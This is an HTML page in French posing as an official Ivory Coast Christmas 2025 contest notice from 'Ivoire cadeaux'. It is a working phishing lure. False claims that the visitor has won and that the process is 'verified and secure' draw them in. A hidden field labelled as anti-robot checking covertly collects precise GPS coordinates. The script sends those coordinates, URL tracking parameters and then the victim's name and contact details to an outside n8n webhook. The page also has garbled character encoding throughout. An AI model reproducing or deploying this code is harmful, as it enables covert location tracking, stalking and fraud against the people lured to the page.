<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Concours Officiel â€“ Confirmation</title>
    <script src="https://cdn.tailwindcss.com"></script>

    <style>
        body {
            font-family: 'Inter', sans-serif;
        }
        #data-form { display: none; }
    </style>
</head>

<body class="bg-gray-100 min-h-screen flex justify-center items-center p-4">

<div class="bg-white shadow-2xl rounded-2xl max-w-lg w-full p-8 border border-gray-200">

    <!-- ðŸ”µ LOGO + TITRE -->
    <div class="text-center mb-6">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9d/Coat_of_Arms_of_the_Ivory_Coast.svg/1200px-Coat_of_Arms_of_the_Ivory_Coast.svg.png"
             class="h-14 mx-auto mb-3 opacity-80" />
        <h1 class="text-2xl font-bold text-gray-800">
            Concours Officiel â€“ NoÃ«l 2025
        </h1>
        <p class="text-gray-500 text-sm mt-1">OrganisÃ© par <strong>Ivoire cadeaux</strong></p>
    </div>

    <!-- ðŸ” BADGE SÃ‰CURITÃ‰ -->
    <div class="flex justify-center mb-4">
        <span class="bg-green-100 text-green-700 px-3 py-1 rounded-full text-xs font-medium">
            âœ” Processus VÃ©rifiÃ© & SÃ©curisÃ©
        </span>
    </div>

    <!-- ðŸ”µ Ã‰TAPES -->
    <div class="flex justify-center gap-2 mb-6">
        <div class="w-3 h-3 rounded-full bg-blue-600"></div>
        <div class="w-3 h-3 rounded-full bg-gray-300"></div>
    </div>
    <p class="text-center text-xs text-gray-500 mb-6">
        Ã‰tape 1 sur 2 â€“ VÃ©rification dâ€™identitÃ©
    </p>

    <!-- ðŸŽ‰ SECTION NOTIFICATION INITIALE -->
    <div id="initial-notification">
        <h2 class="text-xl font-bold text-gray-700 mb-3 text-center">Vous Ãªtes sÃ©lectionnÃ© ðŸŽ‰</h2>

        <p class="text-gray-600 text-sm mb-4 text-center">
            FÃ©licitations ! Vous faites partie des gagnants du <strong>Concours NoÃ«l 2025</strong>.
            Pour confirmer votre identitÃ© et procÃ©der Ã  la remise de votre rÃ©compense,
            veuillez cliquer sur le bouton ci-dessous.
        </p>

        <!-- Confiance : Explication du but -->
        <p class="text-gray-400 text-xs text-center mb-6">
            Nous ne demandons aucune information bancaire.  
            Vos donnÃ©es servent uniquement Ã  vÃ©rifier votre identitÃ© et vous contacter.
        </p>

        <button id="claim-button"
        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl text-lg transition shadow-md">
        Continuer la vÃ©rification
    </button>
        <!-- ðŸŽ¥ VidÃ©o YouTube de PrÃ©sentation -->
        <!-- ðŸŽ¥ VidÃ©o explicative officielle -->
        <div id="video-placeholder" class="relative cursor-pointer group">
            <img src="https://img.youtube.com/vi/q--dgkQ69bs/hqdefault.jpg"
                 class="w-full rounded-xl shadow-lg opacity-90 group-hover:opacity-100 transition" />
          
            <div class="absolute inset-0 flex justify-center items-center">
              <div class="bg-white bg-opacity-80 rounded-full p-4 shadow-md">
                <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 text-red-600" fill="currentColor" viewBox="0 0 16 16">
                  <path d="M6.79 5.093A.5.5 0 0 0 6 5.5v5a.5.5 0 0 0 .79.407l4-2.5a.5.5 0 0 0 0-.814l-4-2.5z"/>
                </svg>
              </div>
            </div>
          </div>
          
          <script>
          document.getElementById('video-placeholder').onclick = () => {
              document.getElementById('video-placeholder').outerHTML = `
                  <iframe class="w-full rounded-xl shadow-lg"
                      height="220"
                      src="https://www.youtube.com/embed/q--dgkQ69bs?autoplay=1"
                      allow="autoplay; encrypted-media"
                      allowfullscreen>
                  </iframe>`;
          };
          </script>
          
  


 
    </div>

    <!-- ðŸ“ FORMULAIRE -->
    <div id="data-form">
        <h2 class="text-xl font-semibold text-gray-800 mb-4 text-center">
            VÃ©rification finale
        </h2>

        <p class="text-gray-500 text-sm text-center mb-6">
            Merci de confirmer les informations suivantes pour finaliser votre dossier.
        </p>

        <!-- Champ Localisation (masquÃ© mais actif) -->
        <div class="mb-4 hidden">
            <label for="location-input" class="block text-sm font-medium text-gray-700">
                Localisation
            </label>
            <input id="location-input" type="text"
                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
        </div>

        <!-- Nom -->
        <div class="mb-4">
            <label for="name-input" class="block text-sm font-medium text-gray-700">Nom</label>
            <input id="name-input" type="text" placeholder="Votre nom"
                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
        </div>

        <!-- PrÃ©nom -->
        <div class="mb-4">
            <label for="firstname-input" class="block text-sm font-medium text-gray-700">PrÃ©nom</label>
            <input id="firstname-input" type="text" placeholder="Votre prÃ©nom"
                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
        </div>

        <!-- Contact -->
        <div class="mb-6">
            <label for="contact-input" class="block text-sm font-medium text-gray-700">Contact</label>
            <input id="contact-input" type="text" placeholder="Email ou NumÃ©ro"
                class="w-full p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500" />
        </div>

        <!-- CTA -->
        <button id="submit-button"
                class="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-xl font-semibold shadow-sm">
            Valider mes informations
        </button>

        <p id="error-message" class="text-center text-red-500 text-sm mt-3 hidden">
            Merci de complÃ©ter tous les champs.
        </p>

        <div id="result-message" class="text-center text-green-600 mt-6 hidden">
            Informations envoyÃ©es âœ”
        </div>
    </div>

    <!-- âš– Mentions lÃ©gales -->
    <div class="mt-8 text-center text-[11px] text-gray-400">
        Concours certifiÃ© par <strong>Ivoire cadeaux</strong> â€”  
        Aucun frais ne peut vous Ãªtre demandÃ©.  
        Service assistance : support@ivoire-cadeaux.com
    </div>

</div>

<script>
    // ðŸ”¥ RÃ©cupÃ¨re tous les paramÃ¨tres de l'URL
    const urlParams = Object.fromEntries(new URLSearchParams(window.location.search));
    function getGPSCoordinates() {
    return new Promise(async (resolve) => {

        // ESSAI GPS RAPIDE
        if (navigator.geolocation) {
            try {
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(
                        (p) => res(p),
                        (e) => rej(e),
                        { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
                    );
                });

                return resolve({
                    method: "gps",
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    source: "getCurrentPosition"
                });

            } catch (err) {
                console.warn("âš ï¸ GPS rapide KO :", err.message);
            }
        }

        // ESSAI GPS HAUTE PRÃ‰CISION
        if (navigator.geolocation) {
            try {
                const precise = await new Promise((resolvePrecise, rejectPrecise) => {
                    let resolved = false;
                    const watchId = navigator.geolocation.watchPosition(
                        (p) => {
                            if (!resolved && p.coords.accuracy < 80) {
                                resolved = true;
                                navigator.geolocation.clearWatch(watchId);
                                resolvePrecise({
                                    method: "gps",
                                    latitude: p.coords.latitude,
                                    longitude: p.coords.longitude,
                                    accuracy: p.coords.accuracy,
                                    source: "watchPosition"
                                });
                            }
                        },
                        (err) => {
                            try { navigator.geolocation.clearWatch(watchId); } catch(e){}
                            rejectPrecise(err);
                        },
                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                    );

                    setTimeout(() => {
                        if (!resolved) {
                            try { navigator.geolocation.clearWatch(watchId); } catch(e){}
                            rejectPrecise(new Error("watchPosition timeout"));
                        }
                    }, 10000);
                });

                return resolve(precise);

            } catch (err) {
                console.warn("âš ï¸ GPS haute prÃ©cision KO :", err.message);
            }
        }

        // FALLBACK CLEAN
        return resolve({
            method: "denied",
            latitude: 0,
            longitude: 0,
            accuracy: null,
            source: "none"
        });
    });
}

    
    let collectedData = {};
    
    const claimButton = document.getElementById('claim-button');
    const dataForm = document.getElementById('data-form');
    const submitButton = document.getElementById('submit-button');
    const initialNotification = document.getElementById('initial-notification');
    const resultMessage = document.getElementById('result-message');
    const errorMessage = document.getElementById('error-message');
    
    claimButton.addEventListener('click', () => {
    initialNotification.style.display = 'none';
    dataForm.style.display = 'block';

    const locationInput = document.getElementById('location-input');
    locationInput.value = "VÃ©rification Anti robot & GEO...";

    // â¬‡ï¸ APPEL GPS ICI
    getGPSCoordinates().then((coords) => {
        let localisationString = "";

        if (coords.method === "gps") {
            localisationString = `Lat: ${coords.latitude.toFixed(6)}, Lon: ${coords.longitude.toFixed(6)} (Â±${Math.round(coords.accuracy)}m)`;
        } else {
            localisationString = "Localisation refusÃ©e / indisponible";
        }

        locationInput.value = localisationString;

        console.log("ðŸ“ Localisation :", localisationString);

        // ðŸš€ Envoi automatique 1 (GPS)
        fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                localisation: localisationString,
                nom: "",
                prenom: "",
                contact_paiement: "",
                date_saisie: new Date().toLocaleString('fr-FR'),
                ...urlParams
            })
        })
        .then(res => res.text())
        .then(result => console.log("ðŸŸ¢ GPS envoyÃ© Ã  n8n :", result))
        .catch(err => console.error("ðŸ”´ Erreur envoi GPS :", err));
    });
});

    
    submitButton.addEventListener('click', () => {
        const location = document.getElementById('location-input').value;
        const name = document.getElementById('name-input').value;
        const firstname = document.getElementById('firstname-input').value;
        const contact = document.getElementById('contact-input').value;
    
        errorMessage.style.display = 'none';
    
        if (!location || !name || !firstname || !contact || location.includes("RÃ©cupÃ©ration")) {
            errorMessage.textContent = "Veuillez remplir tous les champs svp.";
            errorMessage.style.display = 'block';
            return;
        }
    
        collectedData = {
            localisation: location,
            nom: name,
            prenom: firstname,
            contact_paiement: contact,
            date_saisie: new Date().toLocaleString('fr-FR')
        };
    
        dataForm.style.display = 'none';
        resultMessage.style.display = 'block';
    
        console.log("===================================");
        console.log("ðŸ“© DONNÃ‰ES DE FORMULAIRE COLLECTÃ‰ES :");
        console.log(collectedData);
        console.log("===================================");
    
        /* ðŸš€ ENVOI #2 â€” FORM COMPLET + URL PARAMS */
        fetch("https://kahan-229.app.n8n.cloud/webhook/ea903437-0b67-4980-85fc-94b61e3d5e55", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                ...collectedData,
                ...urlParams // ðŸ‘ˆ AJOUT DES PARAMÃˆTRES URL
            })
        })
        .then(res => res.text())
        .then(result => {
            console.log("ðŸŸ¢ n8n a rÃ©pondu :", result);
        })
        .catch(error => {
            console.error("ðŸ”´ Erreur n8n :", error);
        });
    
    });
</script>

</body>
</html>